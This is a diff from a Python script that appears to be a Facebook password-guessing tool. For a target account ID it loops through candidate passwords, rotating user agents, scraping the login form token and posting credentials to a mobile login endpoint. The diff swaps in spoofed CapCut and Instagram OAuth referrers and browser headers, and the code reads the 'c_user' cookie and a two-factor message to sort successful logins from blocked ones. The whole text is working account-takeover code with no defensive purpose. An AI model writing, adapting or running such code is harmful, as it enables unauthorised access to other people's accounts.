@@ -1447,32 +1447,41 @@ def x(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
+            free_fb = Session.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
             data = {
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'next': 'https://m.facebook.com/login/save-device/',
-            'flow': 'login_no_pin',
-            'pass': pw,
-            'login': 'Log in'}
+'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+'email': uid,
+'next': 'https://m.facebook.com/dialog/oauth?client_id=124024574287414&locale=en_US&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%2217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=e5428d80-85a0-4de8-9e72-860dccbb218a&tp=unspecified',
+'flow': 'login_no_pin',
+'pass': pw,
+'login': 'Log in'}
             headers = {
-            'Host': 'd.facebook.com',
-            'Connection': 'keep-alive',
-            'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_Device) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
-            'sec-ch-ua': '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-            'X-Requested-With': 'com.oh.bro',
-            'Sec-Fetch-Site': 'same-site',
-            'Sec-Fetch-Mode': 'no-cors',
-            'Sec-Fetch-Dest': 'image',
-            'Referer': 'https://d.facebook.com/',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'en,en-US;q=0.9'}
+'Host': 'm.prod.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://m.prod.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'x-requested-with': 'XMLHttpRequest',
+'user-agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .17; WOW64)PQ1A)Applewebkit/537.36 (KHTML, like Gecko) Chrome/92.0.4934.52 Safari/537.36 Vivaldi/6.0.2979.18',
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'navigate',
+'sec-fetch-user': '?1',
+'sec-fetch-dest': 'document',
+'dpr': '4',
+'viewport-width': '647',
+'sec-ch-ua': '"Not)A;Brand";v="12", "Chromium";v="100"',
+'sec-ch-ua-mobile': '?1',
+'sec-ch-ua-platform': '"Android"',
+'sec-ch-ua-platform-version': '"9.0.0"',
+'sec-ch-ua-full-version-list': '"Not)A;Brand";v="17.0.0.0", "Chromium";v="106.0.5759.45"',
+'sec-ch-prefers-color-scheme': 'dark',
+'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+'accept-encoding': 'gzip, deflate, br',
+'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://d.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://m.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
